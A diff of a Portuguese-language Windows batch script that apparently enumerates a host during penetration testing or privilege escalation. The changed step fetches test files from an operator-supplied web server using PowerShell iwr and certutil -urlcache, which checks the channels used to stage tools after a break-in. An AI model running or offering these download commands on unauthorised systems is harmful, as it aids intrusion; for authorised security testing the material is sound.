@@ -42,11 +42,14 @@ accesschk.exe -uqwdv %username% * /accepteula
 
 echo 13. Existe algum meio para download/upload de arquivos?
 set /p IP=Digite o ip do seu servidor web em python3 em CIDR (0.0.0.0):
-powershell -Command "iwr -outf test.txt http://%IP%:80/test.txt"
-dir test.txt
+powershell -Command "iwr -outf c:\users\public\powershellok.txt http://%IP%:80/powershellok.txt"
+certutil.exe -urlcache -split -f "http://%IP%:80/certutilok.txt" c:\users\public\certutilok.txt
+dir c:\users\public\powershellok.txt
+dir c:\users\public\certutilok.txt
 ECHO.
-echo 14. Sem erro? use isto:
-echo powershell -Command "iwr -outf test.txt http://IP:80/test.txt"
+echo 14. Caso, consiga visualizar informações do arquivo powershellok.txt e certutilok.txt, é possível usar respectivamente:
+echo powershell -Command "iwr -outf c:\users\public\powershellok.txt http://IP:80/powershellok.txt"
+certutil.exe -urlcache -split -f "http://%IP%:80/certutilok.txt" c:\users\public\certutilok.txt
 ECHO.
 echo 15. Qual o kernel?
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
